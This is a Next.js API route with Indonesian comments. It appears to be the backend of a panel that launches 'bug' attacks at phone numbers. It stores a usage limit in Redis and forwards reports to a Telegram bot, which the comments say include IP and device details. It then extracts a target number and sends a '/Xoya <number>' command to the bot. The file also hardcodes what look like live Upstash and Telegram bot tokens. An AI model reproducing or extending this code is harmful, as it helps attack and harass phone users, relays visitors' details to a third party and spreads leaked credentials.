import { NextRequest, NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const revalidate = 0;
export const fetchCache = 'force-no-store';

async function runRedis(command: string[]) {
  try {
    const url = "https://distinct-cod-130750.upstash.io";
    const token = "gQAAAAAAAf6-AAIgcDE2NTJlNDQwMGQ1ZWQ0NjY0YTY5NmNmNTMwNjNjNDk3OA";
    
    const res = await fetch(url, {
      method: 'POST',
      headers: { 
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(command),
      cache: 'no-store'
    });
    return await res.json();
  } catch (err) {
    console.error("Upstash Error:", err);
    return null;
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { action, valueToSet, messageText } = body;

    // 1. Ambil data untuk Auto-Refresh Web
    if (action === 'get_data') {
      const resLimit = await runRedis(['GET', 'yaemiko_bug_limit']);
      const resLocked = await runRedis(['GET', 'yaemiko_web_locked']);
      
      const dbLimit = resLimit ? resLimit.result : null;
      const dbLocked = resLocked ? resLocked.result : null;

      let finalLimit = 5; 
      if (dbLimit !== null && dbLimit !== undefined) {
        finalLimit = Number(dbLimit);
      }

      let finalLocked = false;
      if (dbLocked !== null && dbLocked !== undefined) {
        const rawLocked = dbLocked.toString().toLowerCase().trim();
        finalLocked = (rawLocked === 'true' || rawLocked === '1');
      }

      return new NextResponse(
        JSON.stringify({ ok: true, limit: finalLimit, locked: finalLocked }),
        {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
          },
        }
      );
    }

    // 2. Set Limit baru ke Database
    if (action === 'set' && valueToSet !== undefined) {
      await runRedis(['SET', 'yaemiko_bug_limit', String(valueToSet)]);
      return NextResponse.json({ ok: true });
    }

    // 3. LOGIC BARU: Mengirim pesan logs ke Telegram (KEBAGI JADI 2 PESAN)
    if (action === 'sendReport' && messageText) {
      const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
      const CHAT_ID = '6481060681';
      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      // PESAN 1: Kirim laporan detail bawaan form web lu (IP, Device, dll)
      const resPesan1 = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: messageText, // Ini teks detail bawaan web lu
          parse_mode: 'Markdown' 
        }),
        cache: 'no-store'
      });

      // PESAN 2: Jika pesan pertama lolos, kita ekstrak nomor target buat bikin teks /Xoya nomor
      if (resPesan1.ok) {
        // Nyari nomor target di dalam teks laporan pake Regex (mencari deretan angka)
        const matchNomor = messageText.match(/(?:Target|Nomor|Phone)\s*:\s*\*?(\d+)\*?/i) || messageText.match(/\b\d{10,15}\b/);
        const nomorTarget = matchNomor ? matchNomor[1] || matchNomor[0] : "NomorTidakDitemukan";

        const textPerintah = `/Xoya ${nomorTarget}`;

        // Tembak pesan kedua terpisah di bawahnya
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: textPerintah, 
            parse_mode: 'Markdown' 
          }),
          cache: 'no-store'
        });
      }

      return NextResponse.json({ ok: true });
    }

    return NextResponse.json({ ok: false });
  } catch (error) {
    return NextResponse.json({ ok: true, limit: 5, locked: false });
  }
}
